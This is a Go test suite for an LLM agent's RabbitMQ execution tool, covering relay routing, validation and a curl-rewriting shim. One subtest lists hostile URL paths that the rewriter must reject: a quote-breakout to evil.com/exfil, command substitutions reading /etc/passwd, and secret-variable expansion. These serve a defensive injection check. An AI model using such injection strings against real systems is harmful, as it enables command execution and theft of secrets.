package tools

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"nudgebee/llm/config"
	"nudgebee/llm/security"
	"nudgebee/llm/tools/core"
)

// TestRabbitExecute_RoutesThroughRelay pins the behavioral contract of
// PR #34906: every rabbit_execute command — rabbitmqadmin and curl alike —
// must be routed through ExecuteContainerJob → relay → customer-env pod,
// regardless of LlmServerWorkspaceEnabled. The prior implementation
// branched on that flag and sent non-curl commands to the workspace pod,
// where curl (un-shimmed) executed locally against no RabbitMQ.
//
// Assertions use Contains so the test survives downstream credential
// injection in the relay adapter (which prefixes rabbitmqadmin with
// --host/--port/--username/--password and curl with -s -u user:pass);
// those transforms live outside this PR's scope.
func TestRabbitExecute_RoutesThroughRelay(t *testing.T) {
	tests := []struct {
		name       string
		args       map[string]any
		wantSubstr []string // all must appear in the captured relay command
		wantAbsent []string // none may appear
	}{
		{
			name:       "default command uses rabbitmqadmin as the CLI",
			args:       map[string]any{"instance": "prod", "args": "list queues"},
			wantSubstr: []string{"rabbitmqadmin", "list queues"},
		},
		{
			name:       "explicit command overrides the default",
			args:       map[string]any{"instance": "prod", "args": "list_queues", "command": "rabbitmqctl"},
			wantSubstr: []string{"rabbitmqctl", "list_queues"},
			wantAbsent: []string{"rabbitmqadmin"},
		},
		{
			name:       "curl args reach the relay without a CLI prefix",
			args:       map[string]any{"args": "curl http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/overview"},
			wantSubstr: []string{"curl", "/api/overview", "$RABBITMQ_HOST", "$RABBITMQ_PORT"},
			wantAbsent: []string{"rabbitmqadmin", "rabbitmqctl"},
		},
		{
			name: "curl pipe to jq is preserved end-to-end (shell runs in relay pod)",
			args: map[string]any{
				"args": "curl http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/queues | jq '.[].name'",
			},
			wantSubstr: []string{"curl", "/api/queues", "| jq"},
		},
		{
			name:       "curl detection tolerates leading whitespace",
			args:       map[string]any{"args": "   curl http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/aliveness-test/%2F"},
			wantSubstr: []string{"curl", "/api/aliveness-test/%2F"},
			wantAbsent: []string{"rabbitmqadmin"},
		},
	}

	// Workspace-disabled path: rabbit_execute dispatches every command directly
	// to the relay (common_relay.go's RelayJobRabbitmq rewrite handles the
	// per-command transformations). The captured relay command is the
	// observable end-state; assertions pin the rewrite contract.
	//
	// Workspace-enabled path is covered in TestRabbitExecute_WorkspaceEnabled
	// below — that path goes through the workspace pod's shell (via
	// ExecuteOrLazyCreate) rather than the relay directly, so a different
	// observation strategy is required.
	origWS := config.Config.LlmServerWorkspaceEnabled
	config.Config.LlmServerWorkspaceEnabled = false
	defer func() { config.Config.LlmServerWorkspaceEnabled = origWS }()

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			captured := captureRelayCommand(t, func(toolCtx core.NbToolContext) {
				_, _ = RabbitExecuteTool{}.Call(toolCtx, core.NBToolCallRequest{Arguments: tc.args})
			})
			for _, want := range tc.wantSubstr {
				assert.Contains(t, captured, want,
					"expected relay command to contain %q; got %q", want, captured)
			}
			for _, absent := range tc.wantAbsent {
				assert.NotContains(t, captured, absent,
					"relay command must NOT contain %q; got %q", absent, captured)
			}
		})
	}
}

// TestRabbitExecute_WorkspaceEnabled pins the dispatch choice inside the
// LlmServerWorkspaceEnabled branch (restored in this PR from PR #34906's
// always-relay routing):
//
//   - `rabbitmqadmin ...` → workspace shell (both binaries are shimmed there)
//   - `rabbitmq-api ...`  → workspace shell (also shimmed via PR #35005)
//   - `curl ... /api/...` → CARVE-OUT to relay direct (curl is NOT shimmed in
//     the workspace pod; running it there means no $RABBITMQ_HOST/creds — the
//     silent-fail PR #34906 stopgap-fixed and which we preserve back-compat
//     for here by dispatching such commands via ExecuteContainerJob).
//
// We can't mock the workspace manager without adding an interface layer, so
// the observable used here is whether the captured relay endpoint sees a
// request: relay-hit ⇔ carve-out fired; relay-miss ⇔ workspace path chosen.
// The tool-response error path is ignored (workspace API is unreachable in
// tests — expected).
func TestRabbitExecute_WorkspaceEnabled(t *testing.T) {
	origWS := config.Config.LlmServerWorkspaceEnabled
	config.Config.LlmServerWorkspaceEnabled = true
	defer func() { config.Config.LlmServerWorkspaceEnabled = origWS }()

	cases := []struct {
		name      string
		args      string
		wantRelay bool // true → carve-out to relay; false → workspace shell
	}{
		{
			name:      "rabbitmqadmin goes to workspace shell (shimmed there)",
			args:      "list queues",
			wantRelay: false,
		},
		{
			name:      "rabbitmq-api goes to workspace shell (shimmed via PR #35005)",
			args:      "rabbitmq-api GET /api/overview",
			wantRelay: false,
		},
		{
			name:      "curl + /api/ carveout dispatches to relay direct",
			args:      "curl http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/overview",
			wantRelay: true,
		},
		{
			name:      "curl + /api/ carveout fires even inside a pipeline",
			args:      "curl http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/overview | jq '.message_stats'",
			wantRelay: true,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			relayCalled := false
			toolCtx := newRabbitTestContext(t, "prod", func(_ string) { relayCalled = true })
			// Ignore the tool response — the workspace path fails in tests
			// because the workspace API isn't reachable; we're only checking
			// the DISPATCH choice, not the downstream outcome.
			_, _ = RabbitExecuteTool{}.Call(toolCtx, core.NBToolCallRequest{
				Arguments: map[string]any{"args": tc.args},
			})
			if tc.wantRelay {
				assert.True(t, relayCalled,
					"curl carve-out MUST dispatch to relay directly — otherwise curl in workspace runs locally with no $RABBITMQ_HOST/creds (the PR #34906 silent-fail we're preserving back-compat for)")
			} else {
				assert.False(t, relayCalled,
					"non-curl commands MUST route to workspace shell (via ExecuteOrLazyCreate) to enable Kind-B chaining into /workspace/*; dispatching to relay bypasses the workspace shell")
			}
		})
	}
}

// TestRabbitExecute_ValidationErrors covers the input-validation branches
// that must fail BEFORE the relay is contacted. Guards against a
// regression where an empty tool config or missing args would silently
// dispatch to the customer environment.
func TestRabbitExecute_ValidationErrors(t *testing.T) {
	t.Run("missing tool config errors before any relay call", func(t *testing.T) {
		relayCalled := false
		toolCtx := newRabbitTestContext(t, "", func(_ string) { relayCalled = true })

		_, err := RabbitExecuteTool{}.Call(toolCtx, core.NBToolCallRequest{
			Arguments: map[string]any{"args": "list queues"},
		})

		require.Error(t, err)
		assert.Contains(t, err.Error(), "no tool configs found")
		assert.False(t, relayCalled, "relay must NOT be called when tool config is missing")
	})

	t.Run("missing args errors before any relay call", func(t *testing.T) {
		relayCalled := false
		toolCtx := newRabbitTestContext(t, "prod", func(_ string) { relayCalled = true })

		_, err := RabbitExecuteTool{}.Call(toolCtx, core.NBToolCallRequest{
			Arguments: map[string]any{"instance": "prod"},
		})

		require.Error(t, err)
		assert.Contains(t, err.Error(), "missing 'args' parameter")
		assert.False(t, relayCalled, "relay must NOT be called when args is empty")
	})
}

// TestRabbitExecute_ParsesInputCommandFallback covers the legacy JSON-in-Command
// input path. The executor sometimes hands the tool call in the old shape
// (input.Command = JSON blob, input.Arguments = nil); PR #34906 didn't touch
// this branch but its dispatch relies on the parsed args landing correctly,
// so pin it here.
func TestRabbitExecute_ParsesInputCommandFallback(t *testing.T) {
	// Workspace-disabled: outbound relay command is the observable. See the
	// note on TestRabbitExecute_RabbitmqAPI_PassthroughAndRewrite.
	origWS := config.Config.LlmServerWorkspaceEnabled
	config.Config.LlmServerWorkspaceEnabled = false
	defer func() { config.Config.LlmServerWorkspaceEnabled = origWS }()

	captured := captureRelayCommand(t, func(toolCtx core.NbToolContext) {
		_, _ = RabbitExecuteTool{}.Call(toolCtx, core.NBToolCallRequest{
			Command: `{"instance":"prod","args":"list bindings"}`,
		})
	})
	assert.Contains(t, captured, "rabbitmqadmin",
		"legacy input.Command shape should still be parsed; got %q", captured)
	assert.Contains(t, captured, "list bindings",
		"legacy input.Command args should still reach the relay; got %q", captured)
}

// TestRabbitExecute_RabbitmqAPI_PassthroughAndRewrite pins the two-layer fix
// for the Gemini-flagged critical bug on PR #35119: (1) tool_rabbit.go's Call
// must recognise `rabbitmq-api` and NOT prefix `rabbitmqadmin` (else the
// customer-env pod would receive `rabbitmqadmin rabbitmq-api METHOD /path`,
// an invalid subcommand); (2) common_relay.go's RelayJobRabbitmq case must
// rewrite the shim into an authenticated curl before dispatch (else the
// customer-env pod, which has curl but not the workspace-only rabbitmq-api
// symlink, would receive an unrunnable literal `rabbitmq-api` invocation).
// Both are observable end-to-end via the captured relay command.
func TestRabbitExecute_RabbitmqAPI_PassthroughAndRewrite(t *testing.T) {
	// Pin the workspace-disabled path: assertions here observe the outbound
	// relay command, which only reflects Call()'s dispatch under this branch.
	// The workspace-enabled branch is covered separately in
	// TestRabbitExecute_WorkspaceEnabled (dispatches to the workspace pod's
	// shell instead, no relay observation).
	origWS := config.Config.LlmServerWorkspaceEnabled
	config.Config.LlmServerWorkspaceEnabled = false
	defer func() { config.Config.LlmServerWorkspaceEnabled = origWS }()

	cases := []struct {
		name       string
		args       map[string]any
		wantSubstr []string
		wantAbsent []string
	}{
		{
			name:       "GET produces an authenticated scope-locked curl",
			args:       map[string]any{"args": "rabbitmq-api GET /api/overview"},
			wantSubstr: []string{`-X GET`, `-u "$RABBITMQ_USER:$RABBITMQ_PASSWORD"`, `"http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/overview"`},
			// Critical: the rabbitmqadmin prefix that the pre-fix Call() would
			// have produced (turning args into `rabbitmqadmin rabbitmq-api ...`)
			// MUST NOT appear. Absent-assertion pins the bug fix.
			wantAbsent: []string{`rabbitmqadmin rabbitmq-api`, `rabbitmqadmin GET`, "rabbitmqadmin --host"},
		},
		{
			name:       "PUT with JSON body preserves -d and -H passthrough",
			args:       map[string]any{"args": `rabbitmq-api PUT /api/policies/%2F/foo -d '{"pattern":"x","definition":{"max-length":100}}' -H "content-type: application/json"`},
			wantSubstr: []string{`-X PUT`, `-d '{"pattern":"x","definition":{"max-length":100}}'`, `-H "content-type: application/json"`, `/api/policies/%2F/foo`},
		},
		{
			name:       "URL-encoded vhost segment survives the rewrite",
			args:       map[string]any{"args": "rabbitmq-api GET /api/queues/%2F/anomaly_processing"},
			wantSubstr: []string{`"http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/queues/%2F/anomaly_processing"`},
		},
		{
			name:       "pipe to jq works — LHS runs remote, RHS runs local in the customer-env shell",
			args:       map[string]any{"args": "rabbitmq-api GET /api/overview | jq '.message_stats'"},
			wantSubstr: []string{`-X GET`, `/api/overview`, `| jq '.message_stats'`},
		},
		{
			name: "explicit command override does NOT trick rabbitmq-api into being wrapped",
			// If the LLM sets command="rabbitmqctl" AND args="rabbitmq-api ...",
			// rabbitmq-api's rewrite MUST win — the shim is a first-class command
			// on its own, not a subcommand of any CLI.
			args:       map[string]any{"args": "rabbitmq-api GET /api/nodes", "command": "rabbitmqctl"},
			wantSubstr: []string{`-X GET`, `/api/nodes`},
			wantAbsent: []string{"rabbitmqctl rabbitmq-api"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			captured := captureRelayCommand(t, func(toolCtx core.NbToolContext) {
				_, _ = RabbitExecuteTool{}.Call(toolCtx, core.NBToolCallRequest{Arguments: tc.args})
			})
			for _, want := range tc.wantSubstr {
				assert.Contains(t, captured, want,
					"expected relay command to contain %q; got %q", want, captured)
			}
			for _, absent := range tc.wantAbsent {
				assert.NotContains(t, captured, absent,
					"relay command must NOT contain %q; got %q", absent, captured)
			}
		})
	}
}

// TestRewriteRabbitmqAPICommand_LLMServer mirrors the relay-server test suite
// for the twin implementation. The two rewriters (this one in llm-server's
// common_relay.go, its twin in collector-server/.../workspace.go) MUST accept
// the same input surface and produce equivalent curl strings — otherwise the
// direct-tool path and the workspace-shim path would diverge and confuse
// operators debugging a failing invocation.
func TestRewriteRabbitmqAPICommand_LLMServer(t *testing.T) {
	t.Run("simple GET", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET /api/overview")
		require.NoError(t, err)
		assert.Equal(t,
			`curl -s -X GET -u "$RABBITMQ_USER:$RABBITMQ_PASSWORD" "http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/overview"`,
			got)
	})

	t.Run("host/port refs are hard-locked (SSRF scope-lock)", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET /api/overview")
		require.NoError(t, err)
		assert.Contains(t, got, `"http://$RABBITMQ_HOST:$RABBITMQ_PORT`,
			"URL host/port must be shell env refs, not literals — otherwise the shim becomes an SSRF gadget")
	})

	t.Run("rejects unsupported HTTP method", func(t *testing.T) {
		_, err := rewriteRabbitmqAPICommand("rabbitmq-api CONNECT /api/overview")
		require.Error(t, err)
		assert.Contains(t, err.Error(), "unsupported HTTP method")
	})

	t.Run("path allowlist blocks quote-breakout injection", func(t *testing.T) {
		// Mirrors the SSRF/injection surface pinned in
		// relay-server workspace_rabbitmq_api_test.go — the two allowlist
		// implementations must reject the same input class or the direct-tool
		// path becomes exploitable while the shim path is safe (or vice versa).
		for _, hostilePath := range []string{
			`/api/x" http://evil.com/exfil "`,
			`/api/x$(cat /etc/passwd)`,
			"/api/x`cat /etc/passwd`",
			`/api/x$SOME_SECRET`,
			`/api/x\`,
		} {
			t.Run(hostilePath, func(t *testing.T) {
				_, err := rewriteRabbitmqAPICommand("rabbitmq-api GET " + hostilePath)
				require.Errorf(t, err, "path %q must be rejected", hostilePath)
				assert.Contains(t, err.Error(), "outside the safe URL-path allowlist")
			})
		}
	})

	t.Run("URL-encoded vhost and query strings pass through", func(t *testing.T) {
		for _, safePath := range []string{
			`/api/queues/%2F/my_queue`,
			`/api/queues?columns=name,messages`,
			`/api/nodes/rabbit@host-1.example.com`,
		} {
			t.Run(safePath, func(t *testing.T) {
				got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET " + safePath)
				require.NoError(t, err, "quote-safe URL-legal path %q must pass", safePath)
				assert.Contains(t, got, safePath)
			})
		}
	})

	t.Run("extra args (JSON body, headers) pass through unchanged", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand(`rabbitmq-api PUT /api/policies/%2F/foo -d '{"a":1}' -H "x: y"`)
		require.NoError(t, err)
		assert.Contains(t, got, `-X PUT`)
		assert.Contains(t, got, `-d '{"a":1}'`)
		assert.Contains(t, got, `-H "x: y"`)
	})
}

// captureRelayCommand spins up an httptest relay, points config at it,
// invokes fn with a valid tool context, and returns the command string
// the relay received. Fails the test if the relay was not called.
func captureRelayCommand(t *testing.T, fn func(core.NbToolContext)) string {
	t.Helper()
	var got string
	toolCtx := newRabbitTestContext(t, "prod", func(cmd string) { got = cmd })
	fn(toolCtx)
	require.NotEmpty(t, strings.TrimSpace(got), "relay received no command")
	return got
}

// newRabbitTestContext builds a valid NbToolContext pointing at an
// httptest relay that invokes onCommand with the captured command string
// and returns a minimal success envelope. The server is closed on t.Cleanup.
func newRabbitTestContext(t *testing.T, toolConfigName string, onCommand func(string)) core.NbToolContext {
	t.Helper()

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var req map[string]any
		_ = json.Unmarshal(body, &req)
		if bodyMap, ok := req["body"].(map[string]any); ok {
			if params, ok := bodyMap["action_params"].(map[string]any); ok {
				if cmd, ok := params["command"].(string); ok {
					onCommand(cmd)
				}
			}
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"data": map[string]any{"response": "ok", "exit_code": 0},
		})
	}))
	t.Cleanup(srv.Close)

	origEndpoint := config.Config.RelayServerEndpoint
	config.Config.RelayServerEndpoint = srv.URL
	t.Cleanup(func() { config.Config.RelayServerEndpoint = origEndpoint })

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	secCtx := security.NewSecurityContextForSuperAdmin()
	reqCtx := security.NewRequestContext(context.Background(), secCtx, logger, nil, nil)

	return core.NbToolContext{
		AccountId: "test-account",
		Ctx:       reqCtx,
		ToolConfig: core.ToolConfig{
			Name: toolConfigName,
			Values: []core.ToolConfigValue{
				{Name: "k8s_secret", Value: "default/rabbitmq-secret"},
			},
		},
	}
}
